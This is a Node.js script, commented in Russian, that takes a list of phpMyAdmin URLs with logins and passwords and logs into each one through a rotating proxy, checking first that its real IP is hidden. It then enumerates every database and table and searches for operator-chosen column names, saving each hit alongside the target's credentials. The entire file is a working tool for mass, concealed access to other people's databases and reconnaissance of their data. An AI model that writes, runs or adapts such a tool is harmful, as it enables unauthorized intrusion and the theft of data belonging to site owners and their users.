const fs = require('fs');
const cheerio = require("cheerio");
const axios = require("axios");
const winston = require("winston");
const readline = require('readline');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { HttpsProxyAgent } = require('https-proxy-agent');

const foundColumnsFilePath = './results/found_columns.txt';

// Настройка логгера
const logger = winston.createLogger({
    level: 'info',
    format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.printf(info => `${info.timestamp} ${info.level}: ${info.message}`)
    ),
    transports: [
        new winston.transports.Console(),
        new winston.transports.File({ filename: './logs/app.log' })
    ]
});

// Чтение прокси из файла
function readProxies(filename) {
    if (fs.existsSync(filename)) {
        return fs.readFileSync(filename, 'utf-8')
            .split('\n')
            .map(line => line.trim())
            .filter(line => line);
    }
    return [];
}

// Чтение данных из файла
function readFileIfExists(filename) {
    if (fs.existsSync(filename)) {
        return new Set(
            fs.readFileSync(filename, 'utf-8')
                .split('\n')
                .map(line => line.trim())
                .filter(line => line)
        );
    }
    return new Set();
}

// Функция для разбора строки
function parseLine(line) {
    const match = line.match(/^(https?:\/\/[^\s:]+(:\d+)?(?:\/[^\s:]*)?):([^:]+):(.+)$/);
    if (match) {
        const [, url, , login, password] = match;
        return { url, login, password };
    }
    return null;
}

class PmaClient {

     phpMyAdminUrl;
     queryUrl;
     cookie;
     login;
     password;
     token;
     pmaCookieVer;
     pma_collation_connection;
     pmaUser_1;
     pmaAuth_1;
     encodedAuth; // для авторизации при ['auth_type'] = 'http'
     session;
     proxy;

    constructor(phpMyAdminUrl, login, password, proxy) {
        this.phpMyAdminUrl = phpMyAdminUrl.endsWith('/') ? phpMyAdminUrl : phpMyAdminUrl + '/';
        this.queryUrl = `${this.phpMyAdminUrl.replace(/index\.php\/?$/, '')}import.php`;
        this.login = login;
        this.password = password;
        this.proxy = proxy;

        const isHTTP = (this.phpMyAdminUrl.split(':')[0].toLowerCase() === 'http');

        // извлекаем данные прокси
        const [proxyHost, proxyPort, proxyUser, proxyPass] = proxy.split(':');
        this.proxyConfig = {
            host: proxyHost,
            port: proxyPort ? parseInt(proxyPort) : undefined,
            auth: proxyUser && proxyPass ? { username: proxyUser, password: proxyPass } : undefined
        };

        // Формируем прокси-URL
        const proxyUrl = `http://${proxyUser}:${proxyPass}@${proxyHost}:${proxyPort}`;

        // Прокси-агент for https
        const httpsAgent = new HttpsProxyAgent(proxyUrl, {
            rejectUnauthorized: false // Отключаем проверку SSL для прокси
        });

        // экземпляр axios с прокси
        this.axiosInstance = axios.create({
            validateStatus: () => true, // Игнорируем ошибки ответа
            proxy: isHTTP && this.proxyConfig,
            httpsAgent,    // для https
            timeout: 5000,
        });
    }

    ////////////////////////////////////////////////////////////////////////////////// временно, удалить
    async checkProxy() {
        try {
            const s = (this.phpMyAdminUrl.split(':')[0].toLowerCase() === 'http') ? '' : 's';
            const response = await this.axiosInstance.get(`http${s}://api.ipify.org?format=text`);
            const proxyIP = response.data;
            logger.info(`🔍 Проверка прокси для ${this.phpMyAdminUrl.split(':')[0]}: Используется IP ${proxyIP}`);
            return response;
        } catch (error) {
            logger.warn(`⚠️ Не удалось проверить IP через прокси: ${error.message}`);
        }
    }

    updateCookies(newCookies) {
        if (!newCookies) return;

        const cookieMap = {
            cookie: ["phpMyAdmin=", "phpMyAdmin_https="],
            pmaCookieVer: ["pmaCookieVer="],
            pma_collation_connection: ["pma_collation_connection="],
            pmaUser_1: ["pmaUser-1=", "pmaUser-1_https="],
            pmaAuth_1: ["pmaAuth-1=", "pmaAuth-1_https="]
        };

        Object.keys(cookieMap).forEach(key => {
            const foundCookie = [...newCookies].reverse().find(cookie =>
                cookieMap[key].some(prefix => cookie.startsWith(prefix))
            );

            if (foundCookie) {
                const cookieValue = foundCookie.split(";")[0];
                if (cookieValue.includes("=deleted")) {
                    return;
                }
                this[key] = cookieValue;
            }
        });
        this.session = this.cookie.replace(/phpMyAdmin(_https)?=/, "");
    }

    updateToken(html) {
        const $ = cheerio.load(html);
        const token = $('input[name="token"]').val();
        if (!token) throw new Error("Не удалось извлечь токен.");
        this.token = token;
    }

    // === Функция для авторизации при ['auth_type'] = 'cookie' ===
    loginAndGetCookies = async () => {

        ////////////////////////////////////////////////////////////// временно, удалить проверка, что запрос идё через прокси
        if (await this.checkProxy().then(res=>res.data.startsWith(this.proxy.split(':')[0]))) {
            logger.info(`✅ Прокси активно (${this.proxy})`);
        } else {
            logger.warn(`⚠️ Прокси не работает, возможен прямой запрос!`);
        }

        try {
            // Запрос к странице входа
            const response = await this.axiosInstance.get(this.phpMyAdminUrl, {
                headers: {"User-Agent": "Mozilla/5.0"},
            });
            // Получаем куки из ответа
            const rawCookies = response.headers["set-cookie"];
            if (rawCookies) {
                this.updateCookies(rawCookies);
            }

            // Извлекаем токен из HTML ответа
            this.updateToken(response.data);

            // Отправляем POST-запрос на авторизацию
            const loginResponse = await this.axiosInstance.post(this.phpMyAdminUrl, new URLSearchParams({
                route: "/",
                token: this.token,
                set_session: this.session,
                pma_username: this.login,
                pma_password: this.password,
                server: "1",
            }).toString(), {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0",
                    Cookie: this.cookie,
                },
                maxRedirects: 0,
                validateStatus: (status) => true,
            });

            // Обновляем куки
            const newCookies = loginResponse.headers["set-cookie"];
            if (newCookies) {
                this.updateCookies(newCookies)
            }

            // ищем токен в Headers.Location
            const location = loginResponse.headers?.location;
            if (location.includes('token=')) {
                const tokenMatch = location.match(/[?&]token=([^&]+)/);
                this.token = tokenMatch ? tokenMatch[1] : undefined;
            } else {
            //если нет в Location - делаем Get запрос
                const response1 = await this.axiosInstance.get(this.phpMyAdminUrl, {
                    headers: {
                        "User-Agent": "Mozilla/5.0",
                        Cookie: [this.cookie, this.pmaUser_1, this.pmaAuth_1, 'pma_lang=ru']
                            .filter(Boolean)
                            .join("; ")
                    }
                })
                this.updateToken(response1.data);
                const cookies = response1.headers['set-cookie']
                if (cookies) {
                    this.updateCookies(cookies)
                }
            }
            logger.info(`Авторизация успешна (${this.phpMyAdminUrl}:${this.login}:${this.password}).`);
            return true;
        } catch (error) {
            logger.error(`❌ Ошибка авторизации (${this.login}:${this.password}) → ${error.message}\n${error.stack}`);
            return false;
        }
    };

    // === Функция для выполнения SQL-запросов ===
    executeSQLQuery = async (query) => {
        try {
            const response = await this.axiosInstance.post(this.queryUrl, new URLSearchParams({
                token: this.token,
                sql_query: query,
                is_js_confirmed: "0",
                ajax_request: "true",
                _nocache: Date.now(),
                goto: "server_sql.php",
                ajax_page_request: true
            }).toString(), {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
                    Cookie: [this.cookie, this.pmaCookieVer, this.pma_collation_connection, this.pmaUser_1, this.pmaAuth_1]
                        .filter(Boolean)
                        .join("; "),
                    Authorization: this.encodedAuth,// for http type auth
                    "X-Requested-With": "XMLHttpRequest"
                },
            });
            if (!response.data.success) throw new Error ('Запрос не выполнен')
            // Обрабатываем HTML-ответ
            const $ = cheerio.load(response.data.message);
            const databases = $('table.table_results tbody tr').map((_, row) => {
                return $(row).find('td').first().text().trim();
            }).get();
            logger.info(`Найденные базы данных в ${this.phpMyAdminUrl} (${databases.length}): ${databases.join(", ")}`); //\x1b[32m${databases.join(", ")}\x1b[0m
            return databases;

        } catch (error) {
            logger.error("❌ Ошибка выполнения SQL-запроса:", error.message);
        }
    }

    // === Функция для поиска колонок в таблицах ===
    findColumnsInTables = async (database, columns) => {

        const columnsToSearch = columns.split(',').map(col => col.trim());

        const likeConditions = columnsToSearch.map(col => `COLUMN_NAME LIKE '%${col}%'`).join(' OR ');
        try {
            const response = await this.axiosInstance.post(this.queryUrl, new URLSearchParams({
                token: this.token,
                sql_query: `SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = '${database}' AND (${likeConditions})`,
                is_js_confirmed: "0",
                ajax_request: "true",
                _nocache: Date.now(),
                goto: "server_sql.php",
                ajax_page_request: true
            }).toString(), {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
                    Cookie: [this.cookie, this.pmaCookieVer, this.pma_collation_connection, this.pmaUser_1, this.pmaAuth_1]
                        .filter(Boolean)
                        .join("; "),
                    Authorization: this.encodedAuth,
                    "X-Requested-With": "XMLHttpRequest"
                },
            });
            if (!response.data.success) throw new Error('Запрос не выполнен');
            const $ = cheerio.load(response.data.message);
            return $('table.table_results tbody tr').map((_, row) => {
                return $(row).find('td').map((_, td) => $(td).text().trim()).get();
            }).get();
        } catch (error) {
            logger.error(`Ошибка выполнения SQL-запроса findColumnsInTables: ${error.message}`);
            return [];
        }
    }

    // === Функция для получения списка всех таблиц ===
    getAllTables = async (database) => {
        try {
            const response = await this.axiosInstance.post(this.queryUrl, new URLSearchParams({
                token: this.token,
                sql_query: `SHOW TABLES FROM \`${database}\``,
                is_js_confirmed: "0",
                ajax_request: "true",
                _nocache: Date.now(),
                goto: "server_sql.php",
                ajax_page_request: true
            }).toString(), {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
                    Cookie: [this.cookie, this.pmaCookieVer, this.pma_collation_connection, this.pmaUser_1, this.pmaAuth_1]
                        .filter(Boolean)
                        .join("; "),
                    Authorization: this.encodedAuth,
                    "X-Requested-With": "XMLHttpRequest"
                },
            });
            if (!response.data.success) throw new Error('Запрос не выполнен');
            const $ = cheerio.load(response.data.message);
            return $('table.table_results tbody tr').map((_, row) => {
                return $(row).find('td').first().text().trim();
            }).get();
        } catch (error) {
            logger.error(`Ошибка выполнения SQL-запроса getAllTables в ${database}: ${error.message}`);
            return [];
        }
    }
}

// Функция для выполнения задачи в потоке
async function workerTask(workerData) {
    const { url, login, password, proxy, columnsToFind } = workerData;
    const client = new PmaClient(url, login, password, proxy);

    if (await client.loginAndGetCookies()) {
        const databases = await client.executeSQLQuery("SHOW DATABASES;");
        const entry = {
            url: url,
            login: login,
            password: password,
            databases: {}
        };

        for (const database of databases) {
            // Поиск колонок
            const foundColumns = await client.findColumnsInTables(database, columnsToFind);
            if (foundColumns.length > 0) {
                foundColumns.forEach((column) => {
                    fs.appendFileSync(foundColumnsFilePath, `${url}:${login}:${password}|${column}\n`);
                });
            }

            // Получение списка таблиц
            const tables = await client.getAllTables(database);
            if (tables.length > 0) {
                entry.databases[database] = tables; // Добавляем таблицы в базу данных
            }
        }

        // Если найдены таблицы, возвращаем результат
        if (Object.keys(entry.databases).length > 0) {
            return entry;
        }
    }
    return null;
}

// Очистка файла found_columns.txt при запуске программы
fs.writeFileSync(foundColumnsFilePath, '');

// Основной поток
if (isMainThread) {
    (async () => {
        const proxies = readProxies('./files/proxies.txt');
        const rawLines = readFileIfExists('./files/input.txt');
        const targets = new Set();

        for (const line of rawLines) {
            const parsed = parseLine(line);
            if (parsed) {
                targets.add(parsed);
            }
        }

        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });

        const columnsToFind = await new Promise((resolve) => {
            rl.question('Введите названия колонок для поиска (через запятую): ', resolve);
        });
        rl.close();

        logger.info(`Поиск колонок: ${columnsToFind}`);

        const workers = [];
        let proxyIndex = 0;
        const results = [];

        for (const { url, login, password } of targets) {
            const proxy = proxies[proxyIndex % proxies.length];
            proxyIndex++;

            const worker = new Worker(__filename, {
                workerData: { url, login, password, proxy, columnsToFind }
            });

            workers.push(worker);

            worker.on('message', (message) => {
                logger.info(`Базы данных с ${JSON.stringify(message.url, null, 2)} обработаны`);
            });

            worker.on('error', (error) => {
                logger.error(`Worker ошибка: ${error.message}`);
            });

            worker.on('exit', (code) => {
                if (code !== 0) {
                    logger.error(`Worker остановлен с кодом выхода: ${code}`);
                }
            });

            worker.on('message', (entry) => {
                if (entry) {
                    results.push(entry);
                }
            });
        }

        // Ожидание завершения всех worker'ов
        await Promise.all(workers.map(worker => new Promise((resolve) => {
            worker.on('exit', resolve);
        })));

        // Запись результатов в JSON-файл
        if (results.length > 0) {
            fs.writeFileSync('./results/all_tables.json', JSON.stringify(results, null, 2));
            logger.info(`Результаты записаны в all_tables.json и found_columns.txt`);
        } else {
            logger.warn('Нет данных для записи в all_tables.json');
        }
    })();
} else {
    // Код для worker'а
    workerTask(workerData)
        .then((entry) => {
            if (entry) {
                parentPort.postMessage(entry);
            }
        })
        .catch(err => {
            logger.error(`Worker error: ${err.message}`);
        });
}